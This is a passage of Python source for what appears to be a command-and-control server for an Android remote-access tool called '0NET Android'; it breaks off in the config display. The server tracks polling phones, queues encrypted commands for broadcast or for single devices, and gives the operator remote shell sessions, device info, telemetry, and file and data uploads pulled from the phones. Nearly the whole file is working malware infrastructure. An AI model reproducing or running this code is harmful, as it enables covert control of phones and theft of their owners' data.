#!/usr/bin/env python3

import sys, os, re, time, threading, socketserver, http.server
import hashlib, random, string, json, shutil
from datetime import datetime
from email.parser import BytesParser
from email.policy import HTTP


# ============================================================
#  CONFIG
# ============================================================

# Must be exactly 16 characters. Rotate at runtime with `setkey` on the console.
ENCRYPTION_KEY = ""

# Network
SERVER_PORT         = 3000
SERVER_BIND_ADDRESS = "0.0.0.0"
SOCKET_TIMEOUT_SEC  = 30

# Request size caps (bytes)
MAX_PAYLOAD_BYTES   = 50 * 1024 * 1024
MAX_DATA_BYTES      = 10 * 1024 * 1024
MAX_UPLOAD_BYTES    = 100 * 1024 * 1024

# Auth token validity window
AUTH_WINDOW_MS      = 300_000        # 5 minutes

# Per-target command backlog
TARGETED_TTL_SEC    = 3600           # 1 hour
TARGETED_MAX_QUEUE  = 100

# Output directories (relative to cwd)
UPLOAD_DIR = "uploads"
DATA_DIR   = "data"


if os.name == 'nt':
    os.system('')


class C:
    RESET = '\033[0m'; BOLD = '\033[1m'; DIM = '\033[2m'
    RED = '\033[31m'; GREEN = '\033[32m'; YELLOW = '\033[33m'
    BLUE = '\033[34m'; MAGENTA = '\033[35m'; CYAN = '\033[36m'; WHITE = '\033[37m'
    BGREEN = '\033[92m'; BRED = '\033[91m'; BYELLOW = '\033[93m'
    BBLUE = '\033[94m'; BMAGENTA = '\033[95m'; BCYAN = '\033[96m'; BWHITE = '\033[97m'


ANSI_RE = re.compile(r'\033\[[0-9;]*m')


def vis_len(s):
    return len(ANSI_RE.sub('', s))


def get_width():
    try:
        w = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        w = 80
    w = min(w - 4, 68)
    return max(w, 44)


def panel_top(title=""):
    w = get_width()
    if title:
        head = "─ " + title + " "
        pad = w - 2 - vis_len(head)
        if pad < 0:
            head = head[:w - 2]; pad = 0
        return C.BCYAN + "╭" + head + ("─" * pad) + "╮" + C.RESET
    return C.BCYAN + "╭" + ("─" * (w - 2)) + "╮" + C.RESET


def panel_bottom():
    w = get_width()
    return C.BCYAN + "╰" + ("─" * (w - 2)) + "╯" + C.RESET


def panel_divider():
    w = get_width()
    return C.BCYAN + "├" + ("─" * (w - 2)) + "┤" + C.RESET


def panel_line(content=""):
    w = get_width()
    inner = w - 4
    vlen = vis_len(content)
    if vlen > inner:
        content = ANSI_RE.sub('', content)[:inner]
        vlen = vis_len(content)
    pad = max(0, inner - vlen)
    return C.BCYAN + "│" + C.RESET + "  " + content + (" " * pad) + C.BCYAN + "│" + C.RESET


def panel_blank():
    w = get_width()
    return C.BCYAN + "│" + C.RESET + (" " * (w - 2)) + C.BCYAN + "│" + C.RESET


def panel_center(plain, styled):
    w = get_width()
    inner = w - 2
    vlen = len(plain)
    if vlen >= inner:
        return C.BCYAN + "│" + C.RESET + plain[:inner] + C.BCYAN + "│" + C.RESET
    tp = inner - vlen
    l = tp // 2; r = tp - l
    return C.BCYAN + "│" + C.RESET + (" " * l) + styled + (" " * r) + C.BCYAN + "│" + C.RESET


def tag(label, color=C.BCYAN):
    return color + "[" + label + "]" + C.RESET


class AES:
    def __init__(self, key):
        if len(key) != 16:
            raise ValueError("Key must be 16 bytes")
        self.key = key
        self.Nb = 4; self.Nk = 4; self.Nr = 10
        self.sbox = [
            0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
            0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
            0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
            0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
            0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
            0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
            0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
            0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
            0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
            0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
            0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
            0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
            0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
            0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
            0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
            0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
        ]
        self.inv_sbox = [0] * 256
        for i, v in enumerate(self.sbox):
            self.inv_sbox[v] = i
        self.Rcon = [0x01000000,0x02000000,0x04000000,0x08000000,0x10000000,
                     0x20000000,0x40000000,0x80000000,0x1b000000,0x36000000]
        self.w = self._key_expansion(key)

    def _sub_word(self, word):
        return (self.sbox[(word >> 24) & 0xFF] << 24 |
                self.sbox[(word >> 16) & 0xFF] << 16 |
                self.sbox[(word >> 8)  & 0xFF] << 8  |
                self.sbox[word & 0xFF])

    def _rot_word(self, word):
        return ((word << 8) & 0xFFFFFFFF) | (word >> 24)

    def _key_expansion(self, key):
        kb = list(key)
        w = [0] * (4 * (self.Nr + 1))
        for i in range(self.Nk):
            w[i] = (kb[4*i] << 24) | (kb[4*i+1] << 16) | (kb[4*i+2] << 8) | kb[4*i+3]
        for i in range(self.Nk, 4 * (self.Nr + 1)):
            temp = w[i-1]
            if i % self.Nk == 0:
                temp = self._sub_word(self._rot_word(temp)) ^ self.Rcon[i // self.Nk - 1]
            w[i] = w[i - self.Nk] ^ temp
        return w

    def _add_round_key(self, state, rnd):
        for i in range(4):
            for j in range(4):
                state[i][j] ^= (self.w[rnd*4+j] >> (24 - 8*i)) & 0xFF

    def _sub_bytes(self, state):
        for i in range(4):
            for j in range(4):
                state[i][j] = self.sbox[state[i][j]]

    def _inv_sub_bytes(self, state):
        for i in range(4):
            for j in range(4):
                state[i][j] = self.inv_sbox[state[i][j]]

    def _shift_rows(self, state):
        state[1][0], state[1][1], state[1][2], state[1][3] = state[1][1], state[1][2], state[1][3], state[1][0]
        state[2][0], state[2][1], state[2][2], state[2][3] = state[2][2], state[2][3], state[2][0], state[2][1]
        state[3][0], state[3][1], state[3][2], state[3][3] = state[3][3], state[3][0], state[3][1], state[3][2]

    def _inv_shift_rows(self, state):
        state[1][0], state[1][1], state[1][2], state[1][3] = state[1][3], state[1][0], state[1][1], state[1][2]
        state[2][0], state[2][1], state[2][2], state[2][3] = state[2][2], state[2][3], state[2][0], state[2][1]
        state[3][0], state[3][1], state[3][2], state[3][3] = state[3][1], state[3][2], state[3][3], state[3][0]

    def _mix_columns(self, state):
        for j in range(4):
            a = [state[i][j] for i in range(4)]
            state[0][j] = self._gf256_mul(0x02, a[0]) ^ self._gf256_mul(0x03, a[1]) ^ a[2] ^ a[3]
            state[1][j] = a[0] ^ self._gf256_mul(0x02, a[1]) ^ self._gf256_mul(0x03, a[2]) ^ a[3]
            state[2][j] = a[0] ^ a[1] ^ self._gf256_mul(0x02, a[2]) ^ self._gf256_mul(0x03, a[3])
            state[3][j] = self._gf256_mul(0x03, a[0]) ^ a[1] ^ a[2] ^ self._gf256_mul(0x02, a[3])

    def _inv_mix_columns(self, state):
        for j in range(4):
            a = [state[i][j] for i in range(4)]
            state[0][j] = (self._gf256_mul(0x0e, a[0]) ^ self._gf256_mul(0x0b, a[1]) ^
                           self._gf256_mul(0x0d, a[2]) ^ self._gf256_mul(0x09, a[3]))
            state[1][j] = (self._gf256_mul(0x09, a[0]) ^ self._gf256_mul(0x0e, a[1]) ^
                           self._gf256_mul(0x0b, a[2]) ^ self._gf256_mul(0x0d, a[3]))
            state[2][j] = (self._gf256_mul(0x0d, a[0]) ^ self._gf256_mul(0x09, a[1]) ^
                           self._gf256_mul(0x0e, a[2]) ^ self._gf256_mul(0x0b, a[3]))
            state[3][j] = (self._gf256_mul(0x0b, a[0]) ^ self._gf256_mul(0x0d, a[1]) ^
                           self._gf256_mul(0x09, a[2]) ^ self._gf256_mul(0x0e, a[3]))

    @staticmethod
    def _gf256_mul(a, b):
        p = 0
        for _ in range(8):
            if b & 1: p ^= a
            carry = a & 0x80
            a = (a << 1) & 0xFF
            if carry: a ^= 0x1B
            b >>= 1
        return p

    def _bytes_to_state(self, data):
        return [[data[4*j+i] for j in range(4)] for i in range(4)]

    def _state_to_bytes(self, state):
        return bytes(state[i][j] for j in range(4) for i in range(4))

    def _encrypt_block(self, plain):
        state = self._bytes_to_state(plain)
        self._add_round_key(state, 0)
        for rnd in range(1, self.Nr):
            self._sub_bytes(state); self._shift_rows(state)
            self._mix_columns(state); self._add_round_key(state, rnd)
        self._sub_bytes(state); self._shift_rows(state)
        self._add_round_key(state, self.Nr)
        return self._state_to_bytes(state)

    def _decrypt_block(self, cipher):
        state = self._bytes_to_state(cipher)
        self._add_round_key(state, self.Nr)
        for rnd in range(self.Nr - 1, 0, -1):
            self._inv_shift_rows(state); self._inv_sub_bytes(state)
            self._add_round_key(state, rnd); self._inv_mix_columns(state)
        self._inv_shift_rows(state); self._inv_sub_bytes(state)
        self._add_round_key(state, 0)
        return self._state_to_bytes(state)

    def encrypt_cbc(self, plaintext, iv):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        pad_len = 16 - (len(plaintext) % 16)
        if pad_len != 16:
            plaintext += b'\x00' * pad_len
        ct = b''
        prev = iv
        for i in range(0, len(plaintext), 16):
            block = plaintext[i:i+16]
            xored = bytes(a ^ b for a, b in zip(block, prev))
            enc = self._encrypt_block(xored)
            ct += enc
            prev = enc
        return ct

    def decrypt_cbc(self, ciphertext, iv):
        if len(ciphertext) % 16 != 0:
            raise ValueError("bad length")
        pt = b''
        prev = iv
        for i in range(0, len(ciphertext), 16):
            block = ciphertext[i:i+16]
            dec = self._decrypt_block(block)
            pt += bytes(a ^ b for a, b in zip(dec, prev))
            prev = block
        return pt.rstrip(b'\x00')


_aes_cache = {}
_aes_cache_lock = threading.Lock()


def _get_aes(key_bytes):
    with _aes_cache_lock:
        a = _aes_cache.get(key_bytes)
        if a is None:
            a = AES(key_bytes)
            _aes_cache[key_bytes] = a
        return a


def derive_aes_key(key_str):
    kb = key_str.encode('utf-8')
    if len(kb) != 16:
        raise ValueError("Key must be 16 chars")
    return kb


SERVER_ENCRYPTION_KEY_STR = ENCRYPTION_KEY
SERVER_AES_KEY = derive_aes_key(SERVER_ENCRYPTION_KEY_STR)
OLD_ENCRYPTION_KEY_STR = ""
OLD_AES_KEY = b""

clients = {}; ip_to_ids = {}; clients_lock = threading.Lock()
broadcast_command = ""; broadcast_command_encrypted = ""; broadcast_timer = None
targeted_commands = {}; target_lock = threading.Lock()
blocked_ips = set(); blocked_lock = threading.Lock()
pending_commands = {}; pending_lock = threading.Lock()
latest_telemetry = {}; telemetry_lock = threading.Lock()


def generate_command_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))


def generate_auth_token(ts, key):
    return hashlib.sha256((ts + ":" + key).encode()).hexdigest()


def verify_auth_token(timestamp, token):
    try:
        ts_int = int(timestamp)
        now = int(time.time() * 1000)
        if abs(now - ts_int) > AUTH_WINDOW_MS:
            return False
    except Exception:
        return False
    if token == generate_auth_token(timestamp, SERVER_ENCRYPTION_KEY_STR):
        return True
    if OLD_ENCRYPTION_KEY_STR and token == generate_auth_token(timestamp, OLD_ENCRYPTION_KEY_STR):
        return True
    return False


def hex_to_bytes(h):
    try:
        return bytes.fromhex(h)
    except Exception:
        return b''


def bytes_to_hex(d):
    return d.hex()


def aes_encrypt(p, k):
    return bytes_to_hex(_get_aes(k).encrypt_cbc(p, b'\x00'*16)) if p else ""


def aes_decrypt(h, k):
    if not h or not k:
        return ""
    try:
        return _get_aes(k).decrypt_cbc(hex_to_bytes(h), b'\x00'*16).decode(errors='ignore')
    except Exception:
        return ""


def encrypt_command(c):
    return aes_encrypt(c, SERVER_AES_KEY)


def decrypt_payload(h):
    p = aes_decrypt(h, SERVER_AES_KEY)
    if p == "" and OLD_AES_KEY:
        p = aes_decrypt(h, OLD_AES_KEY)
    return p


def generate_device_fingerprint_id(ua):
    m = re.search(r'Android (\d+\.\d+(?:\.\d+)?)', ua)
    screen = re.search(r'SCR:(\d+)x(\d+)', ua)
    detailed = "UNKNOWN"
    if m:
        detailed = "ANDROID_" + m.group(1)
        if "SM-" in ua:
            detailed += "_SAMSUNG"
        elif "Pixel" in ua:
            detailed += "_PIXEL"
    if screen:
        detailed += "_SCR" + screen.group(1) + "x" + screen.group(2)
    return hashlib.sha256(detailed.encode()).hexdigest()[:6].upper()


def parse_os_from_user_agent(ua):
    return "Android" if "android" in ua.lower() else "Unknown"


def block_client(target):
    removed = []
    with blocked_lock, clients_lock:
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
            for did in list(ip_to_ids.get(target, [])):
                if did in clients:
                    ip = clients[did]["ip"]
                    blocked_ips.add(ip)
                    removed.append((ip, did))
                    del clients[did]
            if target in ip_to_ids:
                del ip_to_ids[target]
        else:
            tu = target.upper()
            if tu in clients:
                ip = clients[tu]["ip"]
                blocked_ips.add(ip)
                removed.append((ip, tu))
                del clients[tu]
                if ip in ip_to_ids:
                    ip_to_ids[ip].discard(tu)
                    if not ip_to_ids[ip]:
                        del ip_to_ids[ip]
    return removed


def clear_broadcast_command():
    global broadcast_command, broadcast_command_encrypted, broadcast_timer
    broadcast_command = ""
    broadcast_command_encrypted = ""
    broadcast_timer = None


def set_broadcast_command(cmd):
    global broadcast_command, broadcast_command_encrypted, broadcast_timer
    broadcast_command = cmd
    broadcast_command_encrypted = ""
    if broadcast_timer:
        broadcast_timer.cancel()
    broadcast_timer = threading.Timer(60.0, clear_broadcast_command)
    broadcast_timer.daemon = True
    broadcast_timer.start()


def enqueue_targeted(target, cmd):
    now = time.time()
    with target_lock:
        q = targeted_commands.get(target)
        if q is None:
            q = []
            targeted_commands[target] = q
        q.append((cmd, now))
        if len(q) > TARGETED_MAX_QUEUE:
            del q[:len(q) - TARGETED_MAX_QUEUE]


def dequeue_targeted(target):
    with target_lock:
        q = targeted_commands.get(target)
        if not q:
            return None
        now = time.time()
        while q and (now - q[0][1]) > TARGETED_TTL_SEC:
            q.pop(0)
        if not q:
            targeted_commands.pop(target, None)
            return None
        cmd, _ = q.pop(0)
        if not q:
            targeted_commands.pop(target, None)
        return cmd


def add_command_result(target_id, command, output, cmd_id):
    print()
    print(tag("RESULT", C.BGREEN) + " " + C.BOLD + target_id + C.RESET + " " + C.DIM + "·" + C.RESET + " " + command)
    print(C.DIM + ("─" * (get_width() - 2)) + C.RESET)
    for line in output.split("\n"):
        print("  " + line)
    print(C.DIM + ("─" * (get_width() - 2)) + C.RESET)
    print()
    with pending_lock:
        if target_id in pending_commands and cmd_id in pending_commands[target_id]:
            pending_commands[target_id][cmd_id].set()


def remove_stale_ips():
    now = time.time()
    with clients_lock:
        stale = [did for did, c in clients.items() if now - c["ts"] > 3600]
        for did in stale:
            ip = clients[did]["ip"]
            del clients[did]
            if ip in ip_to_ids:
                ip_to_ids[ip].discard(did)
                if not ip_to_ids[ip]:
                    del ip_to_ids[ip]


def human_age(seconds):
    s = int(seconds)
    if s < 60:
        return str(s) + "s ago"
    if s < 3600:
        return str(s // 60) + "m ago"
    return str(s // 3600) + "h ago"


class RequestHandler(http.server.BaseHTTPRequestHandler):
    timeout = SOCKET_TIMEOUT_SEC
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _require_auth(self):
        ts = self.headers.get("X-Timestamp")
        auth = self.headers.get("X-Auth-Token")
        cid = self.headers.get("X-Client-ID")
        if not ts or not auth or not cid:
            self.send_response(401); self.send_header("Content-Length", "0"); self.end_headers()
            return None
        if not verify_auth_token(ts, auth):
            self.send_response(403); self.send_header("Content-Length", "0"); self.end_headers()
            return None
        return cid

    def _read_body_capped(self, cap):
        try:
            length = int(self.headers.get("Content-Length", 0))
        except Exception:
            length = 0
        if length < 0 or length > cap:
            self.send_response(413); self.send_header("Content-Length", "0"); self.end_headers()
            return None
        if length == 0:
            return b""
        return self.rfile.read(length)

    def do_GET(self):
        if self.path != "/":
            self.send_response(404); self.send_header("Content-Length", "0"); self.end_headers()
            return
        try:
            client_ip = self.client_address[0]
            with blocked_lock:
                if client_ip in blocked_ips:
                    self.send_response(403); self.send_header("Content-Length", "0"); self.end_headers()
                    return
            ts = self.headers.get("X-Timestamp")
            auth = self.headers.get("X-Auth-Token")
            if not ts or not auth:
                self.send_response(401); self.send_header("Content-Length", "0"); self.end_headers()
                return
            if not verify_auth_token(ts, auth):
                self.send_response(403); self.send_header("Content-Length", "0"); self.end_headers()
                return

            ua = self.headers.get("User-Agent", "Unknown")
            cidh = self.headers.get("X-Client-ID")
            if cidh and re.match(r'^[A-F0-9]{6}$', cidh, re.I):
                did = cidh.upper()
            else:
                did = generate_device_fingerprint_id(ua)
            osinfo = parse_os_from_user_agent(ua)

            h_model = self.headers.get("X-Device-Model", "") or ""
            h_mfr = self.headers.get("X-Device-Manufacturer", "") or ""
            h_av = self.headers.get("X-Device-Android", "") or ""
            h_bat = self.headers.get("X-Device-Battery", "?") or "?"
            h_chg = self.headers.get("X-Device-Charging", "0") == "1"
            h_scr = self.headers.get("X-Device-Screen", "?")
            h_net = self.headers.get("X-Device-Network", "?") or "?"

            sb = None
            if h_scr == "1": sb = True
            elif h_scr == "0": sb = False

            now = time.time()
            with clients_lock:
                old = clients.get(did)
                fs = old["first_seen"] if old else now
                polls = (old["polls"] + 1) if old else 1
                oip = old["ip"] if old else None
                clients[did] = {
                    "ip": client_ip, "ts": now, "os": osinfo, "model": h_model,
                    "manufacturer": h_mfr, "android": h_av, "battery": h_bat,
                    "charging": h_chg, "screen": sb, "network": h_net,
                    "first_seen": fs, "polls": polls,
                }
                if oip and oip != client_ip:
                    if oip in ip_to_ids:
                        ip_to_ids[oip].discard(did)
                        if not ip_to_ids[oip]:
                            del ip_to_ids[oip]
                if client_ip not in ip_to_ids:
                    ip_to_ids[client_ip] = set()
                ip_to_ids[client_ip].add(did)

            remove_stale_ips()

            cmd = dequeue_targeted(did) or dequeue_targeted(client_ip) or broadcast_command
            if cmd:
                if cmd.startswith("updatekey ") and broadcast_command_encrypted:
                    enc = broadcast_command_encrypted
                else:
                    enc = encrypt_command(cmd)
            else:
                enc = ""

            body = enc.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        except Exception as e:
            print(tag("ERROR", C.BRED) + " do_GET: " + str(e))
            try:
                self.send_response(500); self.send_header("Content-Length", "0"); self.end_headers()
            except Exception:
                pass

    def do_POST(self):
        if   self.path == "/info":        self._handle_info()
        elif self.path == "/result":      self._handle_result()
        elif self.path == "/upload":      self._handle_upload()
        elif self.path == "/data":        self._handle_data()
        elif self.path == "/shellstream": self._handle_shellstream()
        elif self.path == "/telemetry":   self._handle_telemetry()
        else:
            self.send_response(404); self.send_header("Content-Length", "0"); self.end_headers()

    def _handle_info(self):
        try:
            cid = self._require_auth()
            if not cid: return
            body = self._read_body_capped(MAX_PAYLOAD_BYTES)
            if body is None: return
            enc_body = body.decode()
            ip = self.client_address[0]
            with clients_lock:
                known = cid in clients and clients[cid]["ip"] == ip
            if not known:
                self.send_response(403); self.send_header("Content-Length", "0"); self.end_headers()
                return
            it = decrypt_payload(enc_body) or "[Decryption failed]"
            fn = "client_info_" + ip + "_" + str(int(time.time() * 1000)) + ".txt"
            with open(fn, "w", encoding="utf-8") as f:
                f.write(it)
            print()
            print(tag("INFO", C.BCYAN) + " " + C.BOLD + cid + C.RESET + " " + C.DIM + "·" + C.RESET + " " + C.DIM + ip + C.RESET)
            print("  " + C.DIM + "saved to " + C.RESET + C.BWHITE + fn + C.RESET)
            print()
            self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"OK")
        except Exception as e:
            print(tag("ERROR", C.BRED) + " /info: " + str(e))
            self.send_response(500); self.send_header("Content-Length", "0"); self.end_headers()

    def _handle_result(self):
        try:
            cid = self._require_auth()
            if not cid: return
            body = self._read_body_capped(MAX_PAYLOAD_BYTES)
            if body is None: return
            enc_body = body.decode()
            command = self.headers.get("X-Command", "")
            cmd_id = self.headers.get("X-Command-ID", "")
            shell_final = self.headers.get("X-Shell-Final", "") == "1"
            output = decrypt_payload(enc_body) or "[Decryption failed]"
            if shell_final:
                print()
                print(C.DIM + "[shell " + cid + " " + cmd_id + "] " + C.RESET + C.BGREEN + output + C.RESET)
            else:
                add_command_result(cid, command, output, cmd_id)
            self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"OK")
        except Exception as e:
            print(tag("ERROR", C.BRED) + " /result: " + str(e))
            self.send_response(500); self.send_header("Content-Length", "0"); self.end_headers()

    def _handle_shellstream(self):
        try:
            cid_hdr = self._require_auth()
            if not cid_hdr: return
            body = self._read_body_capped(MAX_PAYLOAD_BYTES)
            if body is None: return
            data = json.loads(body.decode('utf-8'))
            cid = data.get("client_id", "")
            if cid != cid_hdr:
                self.send_response(403); self.send_header("Content-Length", "0"); self.end_headers()
                return
            plain = decrypt_payload(data.get("data", "")) or "[decryption failed]"
            for line in plain.split("\n"):
                if line.strip():
                    print(C.DIM + "  | " + C.RESET + line.rstrip())
            self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"OK")
        except Exception as e:
            print(tag("ERROR", C.BRED) + " /shellstream: " + str(e))
            self.send_response(500); self.send_header("Content-Length", "0"); self.end_headers()

    def _handle_telemetry(self):
        try:
            cid = self._require_auth()
            if not cid: return
            body = self._read_body_capped(MAX_PAYLOAD_BYTES)
            if body is None: return
            plain = decrypt_payload(body.decode())
            if plain == "":
                self.send_response(400); self.send_header("Content-Length", "0"); self.end_headers()
                return
            try:
                data = json.loads(plain)
            except Exception:
                self.send_response(400); self.send_header("Content-Length", "0"); self.end_headers()
                return
            with telemetry_lock:
                latest_telemetry[cid] = data
            self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"OK")
        except Exception as e:
            print(tag("ERROR", C.BRED) + " /telemetry: " + str(e))
            self.send_response(500); self.send_header("Content-Length", "0"); self.end_headers()

    def _handle_upload(self):
        try:
            cid_hdr = self._require_auth()
            if not cid_hdr: return
            body = self._read_body_capped(MAX_UPLOAD_BYTES)
            if body is None: return
            msg = BytesParser(policy=HTTP).parsebytes(body)
            client_id = None; command = None; filename = None; file_data = None
            for part in msg.walk():
                if part.get_content_maintype() == 'multipart':
                    continue
                cd = part.get('Content-Disposition', '')
                if 'form-data' not in cd:
                    continue
                name = part.get_param('name', header='Content-Disposition')
                if   name == 'client_id': client_id = part.get_payload(decode=True).decode()
                elif name == 'command':   command   = part.get_payload(decode=True).decode()
                elif name == 'filename':  filename  = part.get_payload(decode=True).decode()
                elif name == 'file':
                    file_data = part.get_payload(decode=True)
                    if not filename:
                        filename = part.get_param('filename', header='Content-Disposition')
            if file_data is None or filename is None:
                self.send_response(400); self.send_header("Content-Length", "0"); self.end_headers()
                return
            client_id = client_id or cid_hdr
            command = command or 'upload'
            if client_id != cid_hdr:
                self.send_response(403); self.send_header("Content-Length", "0"); self.end_headers()
                return
            os.makedirs(UPLOAD_DIR, exist_ok=True)
            ts = int(time.time())
            safe = re.sub(r'[^a-zA-Z0-9_.-]', '_', client_id + "_" + command + "_" + str(ts) + "_" + filename)
            path = os.path.join(UPLOAD_DIR, safe)
            with open(path, 'wb') as f:
                f.write(file_data)
            print()
            print(tag("UPLOAD", C.BGREEN) + " " + C.BOLD + client_id + C.RESET + " " + C.DIM + "·" + C.RESET + " " + command)
            print("  " + C.DIM + "saved to " + C.RESET + C.BWHITE + path + C.RESET + C.DIM + " (" + str(len(file_data)) + " bytes)" + C.RESET)
            print()
            self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"OK")
        except Exception as e:
            print(tag("ERROR", C.BRED) + " /upload: " + str(e))
            self.send_response(500); self.send_header("Content-Length", "0"); self.end_headers()

    def _handle_data(self):
        try:
            cid_hdr = self._require_auth()
            if not cid_hdr: return
            body = self._read_body_capped(MAX_DATA_BYTES)
            if body is None: return
            data = json.loads(body.decode('utf-8'))
            client_id = data.get('client_id', cid_hdr)
            command = data.get('command', 'data')
            if client_id != cid_hdr:
                self.send_response(403); self.send_header("Content-Length", "0"); self.end_headers()
                return
            enc_payload = data.get('data', '')
            if isinstance(enc_payload, str) and enc_payload:
                plain = decrypt_payload(enc_payload)
                if plain:
                    try:
                        payload = json.loads(plain)
                    except Exception:
                        payload = {"_raw": plain}
                else:
                    payload = {"_decryption_failed": True}
            else:
                payload = enc_payload
            os.makedirs(DATA_DIR, exist_ok=True)
            ts = int(time.time())
            safe = re.sub(r'[^a-zA-Z0-9_.-]', '_', client_id + "_" + command + "_" + str(ts) + ".json")
            path = os.path.join(DATA_DIR, safe)
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(payload, f, indent=2)
            print()
            print(tag("DATA", C.BCYAN) + " " + C.BOLD + client_id + C.RESET + " " + C.DIM + "·" + C.RESET + " " + command)
            print("  " + C.DIM + "saved to " + C.RESET + C.BWHITE + path + C.RESET)
            print()
            self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"OK")
        except Exception as e:
            print(tag("ERROR", C.BRED) + " /data: " + str(e))
            self.send_response(500); self.send_header("Content-Length", "0"); self.end_headers()


def print_banner():
    print()
    print(panel_top())
    print(panel_blank())
    print(panel_center("0NET Android", C.BOLD + C.BWHITE + "0NET" + C.RESET + " " + C.WHITE + "Android" + C.RESET))
    print(panel_center("", C.DIM + "" + C.RESET))
    print(panel_blank())
    print(panel_bottom())
    print()


def print_help():
    print()
    print(panel_top("commands"))
    print(panel_line())
    rows = [
        ("show", "List online clients"),
        ("clear", "Clear screen"),
        ("config", "Show config"),
        ("setkey <key>", "Change key"),
        ("updateserver <url>", "New server URL"),
        ("info", "Request info"),
        ("remove <id>", "Block client"),
        ("shell <id>", "Shell session"),
        ("listen <id>", "Live telemetry dashboard"),
        ("<id> <cmd>", "Target client"),
        ("help", "This help"),
    ]
    for cmd, desc in rows:
        print(panel_line(C.BCYAN + cmd.ljust(20) + C.RESET + "  " + C.WHITE + desc + C.RESET))
    print(panel_line())
    print(panel_bottom())
    print()


def print_show():
    remove_stale_ips()
    with clients_lock:
        snapshot = [(did, dict(c)) for did, c in clients.items()]
    with blocked_lock:
        blocked_snapshot = list(blocked_ips)

    now = time.time()
    online = [(did, c) for (did, c) in snapshot if now - c["ts"] < 30]
    online.sort(key=lambda x: -x[1]["ts"])

    print()
    print(panel_top("clients - " + str(len(online)) + " online"))
    print(panel_line())
    if not online:
        print(panel_line(C.DIM + "(no clients online)" + C.RESET))
    else:
        for i, (did, c) in enumerate(online):
            age_s = human_age(now - c["ts"])
            model = (c.get("manufacturer", "") + " " + c.get("model", "")).strip() or "Unknown"
            av = c.get("android", "") or c.get("os", "")
            net = c.get("network", "?")
            bat = c.get("battery", "?")
            chg = c.get("charging", False)
            scr = c.get("screen", None)
            bs = str(bat) + "%"
            if bat != "?" and chg:
                bs += "+"
            ss = "-"
            if scr is True: ss = "on"
            elif scr is False: ss = "off"
            print(panel_line(C.BGREEN + "●" + C.RESET + "  " + C.BOLD + C.BWHITE + did + C.RESET + "   " + C.DIM + age_s + C.RESET))
            print(panel_line("   " + C.WHITE + model + C.RESET + "  " + C.DIM + "·" + C.RESET + "  " + C.WHITE + "Android " + av + C.RESET))
            print(panel_line("   " + C.DIM + c.get("ip", "?") + C.RESET + "  " + C.DIM + "·" + C.RESET + "  " + C.WHITE + str(net) + C.RESET + "  " + C.DIM + "·" + C.RESET + "  " + C.WHITE + bs + C.RESET + "  " + C.DIM + "·" + C.RESET + "  " + C.DIM + "screen " + ss + C.RESET))
            if i < len(online) - 1:
                print(panel_line())
    if blocked_snapshot:
        print(panel_line())
        print(panel_divider())
        print(panel_line(C.BRED + "blocked" + C.RESET + "  " + C.DIM + ", ".join(blocked_snapshot) + C.RESET))
    print(panel_line())
    print(panel_bottom())
    print()


def print_config():
    print()
    print(panel_top("configuration"))
    print(panel_line())
    print(panel_line(C.DIM + "Encryption key".ljust(18) + C.RESET + C.WHITE + "*" * len(SERVER_ENCRYPTION_KEY_STR) + C.RESET))
    if OLD_ENCRYPTION_KEY_STR:
